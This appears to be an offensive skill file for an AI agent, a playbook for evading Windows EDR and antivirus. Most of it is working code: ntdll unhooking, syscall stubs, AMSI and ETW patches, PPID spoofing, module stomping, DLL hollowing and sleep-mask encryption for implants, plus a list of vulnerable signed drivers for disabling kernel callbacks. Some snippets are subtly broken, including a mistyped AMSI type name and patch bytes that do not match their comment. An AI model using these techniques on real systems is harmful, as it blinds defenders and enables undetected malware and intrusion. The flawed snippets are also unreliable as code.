---
name: edr-evasion
description: EDR/AV bypass — hook unhooking, direct/indirect syscalls, PPID spoofing, process injection, AMSI bypass, ETW patching, memory encryption, behavioral evasion
metadata:
  type: offensive
  phase: evasion
  tools: syscall-stubs, ntdll-unhooking, amsi-patch, etw-patch, process-hollowing
kill_chain:
  phase: [delivery, install]
  step: [3, 5]
  attck_tactics: [TA0005]
depends_on: [exploit-development, shellcode-dev]
feeds_into: [red-team-ops, initial-access]
inputs: [edr_product, payload]
outputs: [evasive_payload, bypass_technique]
---

# EDR Evasion

## When to Activate

- Planning EDR bypass during red team engagements
- Researching AV/EDR evasion techniques
- Developing implants that must survive endpoint detection
- Testing detection capabilities of security products

## Fundamentals

### AV vs EDR

**Antivirus (preventive)**:
- Static analysis: matching known signatures in files
- Dynamic analysis: limited behavioral monitoring/sandboxing
- Effective against known threats, weaker against advanced attacks

**EDR (proactive & investigative)**:
- Continuous endpoint monitoring
- Behavioral analysis at kernel level
- Anomaly detection and post-compromise visibility
- Prioritizes incident response and investigation

### Windows Execution Flow

```
Application → DLL (kernel32/ntdll) → Syscall → Kernel (ntoskrnl)
                    ↑
              EDR hooks here
              (userland hooks in ntdll)
```

## Hook Unhooking

### Userland Unhooking (ntdll.dll)

EDRs hook ntdll functions by replacing the first bytes with a JMP to their inspection code.

```c
// Method 1: Map fresh ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

// Get .text section of loaded ntdll
HMODULE loadedNtdll = GetModuleHandleA("ntdll.dll");
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)loadedNtdll;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)loadedNtdll + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);

// Overwrite hooked .text with clean copy
DWORD oldProtect;
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    (LPVOID)((BYTE*)freshNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize);
VirtualProtect((LPVOID)((BYTE*)loadedNtdll + textSection->VirtualAddress),
    textSection->Misc.VirtualSize, oldProtect, &oldProtect);
```

```c
// Method 2: Map from KnownDlls (avoids disk read)
HANDLE hSection;
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, &name, 0, NULL, NULL };
NtOpenSection(&hSection, SECTION_MAP_READ, &oa);
PVOID freshNtdll = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &freshNtdll, 0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READONLY);
```

### Kernel-Level Unhooking Detection

Some EDRs use kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks) — these cannot be bypassed from userland alone. Requires:
- BYOVD (Bring Your Own Vulnerable Driver) to unload/disable kernel callbacks
- Direct kernel object manipulation (DKOM)

## Direct & Indirect Syscalls

### Direct Syscalls

Skip ntdll entirely — call the syscall instruction directly:

```nasm
; NtAllocateVirtualMemory syscall (Windows 10 21H2)
mov r10, rcx
mov eax, 0x18          ; syscall number (varies by Windows version!)
syscall
ret
```

**Tools**: SysWhispers3, HellsGate, HalosGate, TartarusGate

### Indirect Syscalls

JMP to the `syscall; ret` instruction inside ntdll (avoids "syscall from non-ntdll" detection):

```nasm
; Find syscall;ret gadget in ntdll
mov r10, rcx
mov eax, SSN           ; System Service Number
jmp [ntdll_syscall_ret_addr]  ; JMP to syscall;ret in ntdll
```

**Why indirect**: Some EDRs check the return address of syscalls — if it's not within ntdll's address range, it's flagged.

### SSN Resolution

```c
// HellsGate: read SSN from ntdll function prologue
// Clean function: mov r10, rcx; mov eax, SSN; ...
// Hooked function: jmp <hook_addr> (first bytes replaced)
// HalosGate: if hooked, look at neighbor functions (SSN ± 1)
// TartarusGate: walk further neighbors if immediate ones also hooked
```

## AMSI Bypass

```powershell
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative: patch in memory
$a=[Ref].Assembly.GetType('System.Management.Automation.A]msiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
[IntPtr]$ptr=$b.GetValue($null)
[Int32[]]$buf=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

```c
// C implementation: patch AmsiScanBuffer
HMODULE amsi = LoadLibraryA("amsi.dll");
LPVOID addr = GetProcAddress(amsi, "AmsiScanBuffer");
DWORD oldProtect;
VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
// xor eax, eax; ret (return S_OK with AMSI_RESULT_CLEAN)
memcpy(addr, "\x31\xC0\x05\x4E\xFE\xFF\xFF\xC3", 8);
VirtualProtect(addr, 6, oldProtect, &oldProtect);
```

## ETW Patching

```c
// Patch EtwEventWrite to immediately return
// Blinds .NET CLR logging, PowerShell ScriptBlock logging
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
LPVOID etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
DWORD oldProtect;
VirtualProtect(etwAddr, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
*(BYTE*)etwAddr = 0xC3;  // ret
VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
```

## PPID Spoofing

```c
// Make process appear to be spawned by explorer.exe
SIZE_T size = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
LPPROC_THREAD_ATTRIBUTE_LIST attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
InitializeProcThreadAttributeList(attrList, 1, 0, &size);

HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPid);
UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);

STARTUPINFOEXA si = { sizeof(si) };
si.lpAttributeList = attrList;
PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
    NULL, NULL, &si.StartupInfo, &pi);
```

## Process Injection Techniques

| Technique | Stealth | Notes |
|-----------|---------|-------|
| CreateRemoteThread | Low | Heavily monitored |
| NtQueueApcThread (Early Bird) | Medium | APC before thread starts |
| NtSetContextThread | Medium | Hijack suspended thread |
| Module Stomping | High | Overwrite legitimate DLL .text |
| Phantom DLL Hollowing | High | Map section, overwrite |
| ThreadlessInject | Very High | No new threads created |
| Process Hollowing | Medium | Unmap + remap |
| Transacted Hollowing | High | NTFS transactions |

### ThreadlessInject Pattern
```
1. Find target process with suitable DLL loaded
2. Locate exported function that's rarely called
3. Overwrite function prologue with: push shellcode_addr; ret
4. Wait for natural execution of that function
5. No CreateRemoteThread, no APC — completely threadless
```

## Memory Encryption (Sleep Masking)

```c
// Encrypt beacon memory during sleep to avoid memory scanners
// Cobalt Strike: set sleep_mask "true" in profile
// Custom implementation:
void SleepEncrypt(DWORD sleepTime) {
    // 1. Encrypt all RX sections with XOR/RC4
    BYTE key[16]; GenerateRandomKey(key);
    EncryptMemory(beaconBase, beaconSize, key);
    
    // 2. Change memory protection to RW (no execute)
    VirtualProtect(beaconBase, beaconSize, PAGE_READWRITE, &old);
    
    // 3. Sleep
    SleepEx(sleepTime, FALSE);
    
    // 4. Restore RX and decrypt
    VirtualProtect(beaconBase, beaconSize, PAGE_EXECUTE_READ, &old);
    DecryptMemory(beaconBase, beaconSize, key);
}
```

## Behavioral Evasion

### Sandbox Detection
```c
// Check indicators before detonation:
// - Domain joined? (GetComputerNameEx)
// - RAM > 4GB? (GlobalMemoryStatusEx)
// - CPU cores > 2? (GetSystemInfo)
// - Disk > 60GB? (GetDiskFreeSpaceEx)
// - User interaction? (GetLastInputInfo — idle time)
// - Known sandbox usernames? (John, sandbox, malware, virus)
// - VM artifacts? (VMware tools, VBox Guest Additions)
```

### Execution Guardrails (Keying)
```c
// Only execute on intended target — prevents sandbox analysis
// Key to: domain name, username, hostname, MAC address
char computerName[256];
GetComputerNameA(computerName, &size);
BYTE key[32];
SHA256(computerName, strlen(computerName), key);
// Use key to decrypt payload — wrong machine = garbage output
```

## Advanced: Sleep Obfuscation Techniques

### Ekko (Timer-Based)
```c
// Use NtCreateTimerQueue + NtSetTimer to encrypt/decrypt beacon memory
// Flow: Set timer → encrypt memory → change to RW → sleep → timer fires → 
//       change to RX → decrypt memory → resume execution

HANDLE hTimerQueue = NULL;
CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureContext, &ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);

// Timer callback chain:
// 1. NtContinue → capture context
// 2. VirtualProtect → RW
// 3. SystemFunction032 (RC4 encrypt) → encrypt beacon
// 4. WaitForSingleObject → actual sleep
// 5. SystemFunction032 → decrypt beacon  
// 6. VirtualProtect → RX
// 7. NtContinue → resume execution

// Key: all operations happen in timer thread — main thread is suspended
// EDR sees: legitimate timer callbacks, not suspicious API sequences
```

### Zilean (APC-Based)
```c
// Queue APCs to current thread for sleep obfuscation
// Each APC performs one step of the encrypt-sleep-decrypt chain

NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)VirtualProtect, 
    beaconBase, beaconSize, PAGE_READWRITE);
NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)SystemFunction032,
    &img, &key);  // RC4 encrypt
NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)WaitForSingleObject,
    hEvent, sleepTime, 0);
NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)SystemFunction032,
    &img, &key);  // RC4 decrypt
NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)VirtualProtect,
    beaconBase, beaconSize, PAGE_EXECUTE_READ);

// Trigger APC execution
NtTestAlert();
```

### DeathSleep (Thread Pool)
```c
// Abuse Windows thread pool for sleep obfuscation
// Register work items that handle encrypt/sleep/decrypt
// Thread pool threads are inherently trusted by EDRs

TP_CALLBACK_ENVIRON callbackEnv;
TpInitializeCallbackEnviron(&callbackEnv);

// Create thread pool work items for each step
CreateThreadpoolWork(EncryptCallback, &ctx, &callbackEnv);
CreateThreadpoolWork(SleepCallback, &ctx, &callbackEnv);
CreateThreadpoolWork(DecryptCallback, &ctx, &callbackEnv);

// Submit and wait — execution flows through ntdll thread pool
SubmitThreadpoolWork(encryptWork);
WaitForThreadpoolWorkCallbacks(decryptWork, FALSE);
```

### Gargoyle (ROP-Based Non-Executable Sleep)
```c
// Mark all beacon memory as non-executable during sleep
// Use ROP gadget to re-mark as executable and resume
// Key: beacon exists only as RW data while sleeping — invisible to memory scanners

// 1. Build ROP chain on stack:
//    VirtualProtect(beacon, size, PAGE_EXECUTE_READ, &old)
//    JMP beacon_entry
// 2. Set timer with callback = stack pivot gadget (xchg rsp, rax; ret)
// 3. VirtualProtect beacon to PAGE_READWRITE
// 4. Encrypt beacon memory
// 5. Sleep (WaitForSingleObject)
// 6. Timer fires → stack pivot → ROP chain executes → beacon decrypted and RX
```

## Advanced: Stack Spoofing

### SilentMoonwalk (Full Stack Spoofing)
```c
// Problem: EDRs walk the call stack on API calls — suspicious return addresses flagged
// Solution: Desynchronize real return addresses from what stack walking sees

// Technique 1: Frame pointer spoofing
// Overwrite RBP chain to point to legitimate-looking stack frames
// Stack walker follows RBP → sees clean call chain

// Technique 2: Return address overwrite with restore
void SpoofStack(PVOID targetFunc, PVOID fakeRetAddr) {
    // Save real return address
    PVOID realRet = _ReturnAddress();
    
    // Overwrite return address on stack with legitimate ntdll address
    *(PVOID*)(_AddressOfReturnAddress()) = fakeRetAddr;
    
    // Call target function — EDR sees clean return address
    targetFunc();
    
    // Restore real return address
    *(PVOID*)(_AddressOfReturnAddress()) = realRet;
}

// Technique 3: Synthetic frames
// Build entire fake stack frames before API calls
// Each frame points to a real function in ntdll/kernel32
// Stack looks like: ntdll!RtlUserThreadStart → kernel32!BaseThreadInitThunk → ...
```

### CallStackMasker
```c
// Replace return addresses on stack before each API call
// Use unwinding metadata (.pdata/.xdata) to build valid frames
// Each fake frame must have:
// 1. Valid return address (within a real module)
// 2. Correct frame pointer alignment
// 3. Matching unwind info for the module

typedef struct _STACK_FRAME {
    PVOID ReturnAddress;
    PVOID FramePointer;
    PVOID ModuleBase;
} STACK_FRAME;

// Pre-compute clean frame sets from known-good modules
// Swap in before syscalls, restore after
```

## Advanced: Modern EDR Internals

### ETW Threat Intelligence Provider
```c
// Microsoft-Windows-Threat-Intelligence ETW provider
// Runs at KERNEL level — CANNOT be patched from userland
// Monitors: NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory,
//           NtMapViewOfSection, NtQueueApcThread, NtSetContextThread

// What it reports to EDR kernel driver:
// - RWX allocations
// - W→X protection changes
// - Cross-process memory writes
// - APC injections
// - Thread context modifications

// Evasion approaches:
// 1. Use functions not monitored (NtCreateSection + NtMapViewOfSection with separate views)
// 2. BYOVD to unregister the ETW TI callback
// 3. Use legitimate code paths (DLL loading, memory-mapped files)
// 4. Avoid monitored API patterns entirely
```

### Kernel Callbacks
```c
// EDR kernel drivers register callbacks that fire on:
// PsSetCreateProcessNotifyRoutineEx — process creation
// PsSetCreateThreadNotifyRoutine — thread creation  
// PsSetLoadImageNotifyRoutine — DLL/image loading
// ObRegisterCallbacks — handle operations (open process/thread)
// CmRegisterCallback — registry operations
// FltRegisterFilter — filesystem minifilter (file operations)

// Callback removal via BYOVD:
// 1. Load vulnerable signed driver (RTCore64.sys, dbutil_2_3.sys)
// 2. Use driver's read/write primitives to:
//    a. Walk PspCreateProcessNotifyRoutine array
//    b. Find EDR's callback entry
//    c. Zero it out or replace with no-op

// Known BYOVD targets (signed, vulnerable):
// RTCore64.sys — MSI Afterburner (arbitrary R/W)
// dbutil_2_3.sys — Dell BIOS utility (arbitrary R/W)  
// gdrv.sys — GIGABYTE driver (arbitrary R/W)
// ene.sys — ENE Technology (arbitrary R/W)
// WinRing0x64.sys — OpenHardwareMonitor (arbitrary R/W)
```

### Minifilter Evasion
```c
// EDR filesystem minifilters intercept all file I/O
// They sit at specific altitudes in the filter stack

// Evasion techniques:
// 1. Direct NTFS parsing — bypass filter stack entirely
//    Open \\.\PhysicalDrive0, read MFT, parse NTFS structures
// 2. Reparse point abuse — redirect file operations
// 3. Symbolic link manipulation
// 4. Transaction rollback (TxF) — write in transaction, EDR sees, rollback, 
//    then write again without transaction flag

// Altitude ranges:
// 320000-329999: Anti-Virus filters
// 360000-389999: Activity monitors (most EDRs here)
// Check installed minifilters: fltMC
```

## Advanced: Hardware Breakpoint Hooking

```c
// Use debug registers (DR0-DR3) instead of inline hooks
// Advantage: no code modification — invisible to integrity checks

// Set hardware breakpoint on target function
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(hThread, &ctx);

ctx.Dr0 = (DWORD64)targetFunction;  // breakpoint address
ctx.Dr7 = 0x1;                       // enable DR0, break on execution

SetThreadContext(hThread, &ctx);

// Register VEH to handle the breakpoint
AddVectoredExceptionHandler(1, HookHandler);

LONG CALLBACK HookHandler(PEXCEPTION_POINTERS pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == targetFunction) {
            // Redirect execution or modify arguments
            pExceptionInfo->ContextRecord->Rip = (DWORD64)hookFunction;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Advantage over inline hooks:
// - No code modification (passes integrity checks)
// - Works on read-only pages
// - Limited to 4 breakpoints (DR0-DR3)
```

## Advanced: Module Stomping & Phantom DLL Hollowing

### Module Stomping
```c
// Overwrite .text section of a loaded legitimate DLL with shellcode
// Process loads real DLL → overwrite its code → execute
// EDR sees: code executing from legitimate module address range

// 1. Load benign DLL (e.g., amsi.dll, xpsservices.dll)
HMODULE hModule = LoadLibraryA("xpsservices.dll");

// 2. Find .text section
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dos->e_lfanew);
PIMAGE_SECTION_HEADER text = IMAGE_FIRST_SECTION(nt);

// 3. Make writable, overwrite with shellcode
VirtualProtect((LPVOID)((BYTE*)hModule + text->VirtualAddress),
    text->Misc.VirtualSize, PAGE_READWRITE, &oldProtect);
memcpy((LPVOID)((BYTE*)hModule + text->VirtualAddress), shellcode, scSize);
VirtualProtect((LPVOID)((BYTE*)hModule + text->VirtualAddress),
    text->Misc.VirtualSize, PAGE_EXECUTE_READ, &oldProtect);

// 4. Execute — return address appears within legitimate DLL
```

### Phantom DLL Hollowing
```c
// Map a DLL as a section, modify it, execute — never touches disk
// Avoids LoadLibrary hooks and file system minifilters

// 1. Create section from DLL on disk (read-only mapping)
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\amsi.dll", ...);
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, 
    PAGE_READONLY, SEC_IMAGE, hFile);

// 2. Map writable view (local)
PVOID localView = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView,
    0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_READWRITE);

// 3. Overwrite .text with shellcode in local view
memcpy((BYTE*)localView + textRVA, shellcode, scSize);

// 4. Map executable view (separate mapping of same section)
PVOID execView = NULL;
NtMapViewOfSection(hSection, GetCurrentProcess(), &execView,
    0, 0, NULL, &viewSize, ViewUnmap, 0, PAGE_EXECUTE_READ);

// 5. Execute from execView — appears as amsi.dll in memory
```

## Advanced: Process Injection Techniques (2024-2026)

### Pool Party (Thread Pool Injection)
```c
// Abuse Windows Thread Pool for code execution in remote process
// 7 variants targeting different TP structures:
// 1. TP_WORK — worker item insertion
// 2. TP_TIMER — timer callback hijack
// 3. TP_WAIT — wait callback hijack
// 4. TP_IO — I/O completion callback
// 5. TP_ALPC — ALPC callback
// 6. TP_JOB — job notification callback
// 7. TP_DIRECT — direct insertion

// Variant 1: Worker factory injection
// Write shellcode to remote process
// Hijack TP_WORK callback to point to shellcode
// Submit work item → thread pool executes shellcode
// No CreateRemoteThread, no APC — pure thread pool abuse
```

### Mockingjay (RWX Section Injection)
```c
// Find DLLs with existing RWX sections (no VirtualProtect needed)
// Write shellcode directly into RWX section of target process
// No memory allocation, no protection changes — minimal EDR signals

// Known DLLs with RWX sections:
// msys-2.0.dll (MSYS2/Git for Windows)
// cygwin1.dll (Cygwin)

// Steps:
// 1. Load DLL with RWX section into target process
// 2. Write shellcode into the RWX section
// 3. Create thread at RWX address (or hijack existing)
// Only 2 API calls needed vs 6+ for traditional injection
```

### Dirty Vanity (Process Forking)
```c
// Use NtCreateProcessEx with PROCESS_CREATE_FLAGS_FORK
// Forks current process including all memory — snapshot-based injection
// Child process is exact copy, including injected code
// EDR sees: process creation (not injection), child inherits parent's reputation

NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
    GetCurrentProcess(),  // parent = self
    PROCESS_CREATE_FLAGS_FORK, NULL, NULL, NULL, 0);
// Child process starts with copy of all memory
// Shellcode already in memory from parent — no cross-process write needed
```

## Windows 11 24H2 Considerations

- AMSI heap scanning is active — allocate with PAGE_NOACCESS, decrypt in place, then switch to PAGE_EXECUTE_READ
- Smart App Control may block outbound connections from unsigned processes
- Kernel-mode ETW (Threat Intelligence) cannot be patched from userland
- Enhanced stack tracing in newer EDRs checks full call stack, not just return address
- Kernel Data Protection (KDP) prevents modification of kernel data structures via BYOVD on VBS-enabled systems
- User-mode CET shadow stacks detect ROP chains in userland
- Process mitigation policies can block DLL injection, dynamic code, and child processes
